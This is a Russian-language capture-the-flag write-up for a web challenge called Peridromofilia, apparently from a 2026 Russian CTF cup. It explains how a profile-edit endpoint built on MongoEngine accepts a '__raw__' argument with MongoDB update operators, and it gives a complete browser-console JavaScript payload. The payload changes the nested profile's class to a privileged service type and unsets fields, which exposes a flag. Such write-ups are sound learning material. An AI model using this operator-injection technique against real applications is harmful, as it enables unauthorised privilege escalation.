# Peridromofilia

**Турнир:** Кубок CTF России 2026 · **Категория:** web

**Статус:** Решено.

## Кратко

Через mass assignment в MongoEngine можно заменить тип вложенного профиля на служебный и открыть статус с флагом.

## Решение

Зарегистрируемся и исследуем редактирование профиля: `PATCH /api/profile` принимает JSON. Ошибки на неизвестные поля указывают на MongoEngine. Специальный аргумент `__raw__` позволяет передать MongoDB-операторы обновления.

Тип вложенного профиля хранится в `profile._cls`. Установка значения `Profile.ServiceCard` меняет класс профиля, но обычные поля `nickname` и `home_station` несовместимы с ним. Поэтому в том же обновлении удаляем оба поля через `$unset`. Изменение корневого `_cls` сломало бы пользовательский документ.

Выполним в консоли браузера в авторизованной сессии:

```javascript
(async () => {
    const payload = {
        "__raw__": {
            "$set": {
                "profile._cls": "Profile.ServiceCard"
            },
            "$unset": {
                "profile.nickname": "",
                "profile.home_station": ""
            }
        }
    };

    const r = await fetch("/api/profile", {
        method: "PATCH",
        credentials: "same-origin",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    });

    console.log(r.status, await r.text());
})();
```

Ответ `200 {"ok":true}` подтверждает обновление. После этого страница `/me` показывает служебный статус с флагом.

## Флаг

Флаг найден.
